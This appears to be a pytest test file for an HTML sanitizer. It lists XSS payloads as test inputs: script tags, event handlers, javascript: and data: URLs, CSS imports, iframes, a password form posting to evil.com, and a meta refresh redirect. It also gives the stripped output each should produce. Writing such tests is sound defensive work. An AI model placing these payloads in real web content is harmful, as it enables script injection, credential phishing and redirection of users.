import pytest
from src.service.artifacts.sanitizer import sanitize_artifact

@pytest.mark.parametrize("malicious, expected", [
    # Basic script tags
    ("<script>alert(1)</script>", ""),
    ("<script src=\"http://evil.com/x.js\"></script>", ""),
    # Event handlers
    ("<div onerror=\"alert(1)\">text</div>", "<div>text</div>"),
    ("<img src=\"x\" onerror=\"alert(1)\">", "<img src=\"x\">"),
    ("<a href=\"#\" onclick=\"alert(1)\">link</a>", "<a href=\"#\" rel=\"noopener noreferrer\">link</a>"),
    # javascript: and data: URLs
    ("<a href=\"javascript:alert(1)\">link</a>", "<a rel=\"noopener noreferrer\">link</a>"),
    ("<a href=\"data:text/html,<script>alert(1)</script>\">link</a>", "<a rel=\"noopener noreferrer\">link</a>"),
    # CSS fetch vectors
    ("<style>@import url('http://evil.com/css');</style>", "<style></style>"),
    ("<div style=\"background-image: url('javascript:alert(1)')\">text</div>", "<div style=\"background-image: ')\">text</div>"),
    ("<div style=\"width: expression(alert(1))\">text</div>", "<div style=\"width: )\">text</div>"),
    # IFrames and objects
    ("<iframe src=\"http://evil.com\"></iframe>", ""),
    ("<object data=\"http://evil.com\"></object>", ""),
    ("<embed src=\"http://evil.com\">", ""),
    # Form elements (phishing)
    ("<form action=\"http://evil.com\"><input type=\"password\"></form>", ""),
    # Meta refresh
    ("<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">", ""),
    # Safe tags shouldn't be stripped
    ("<h1>Heading</h1><p>Text</p><ul><li>List</li></ul>", "<h1>Heading</h1><p>Text</p><ul><li>List</li></ul>"),
    ("<a href=\"https://google.com\">link</a>", "<a href=\"https://google.com\" rel=\"noopener noreferrer\">link</a>"),
])
def test_html_sanitizer_exhaustive(malicious, expected):
    """
    Ensure all malicious vectors are stripped by the sanitizer.
    """
    assert sanitize_artifact("html", malicious) == expected
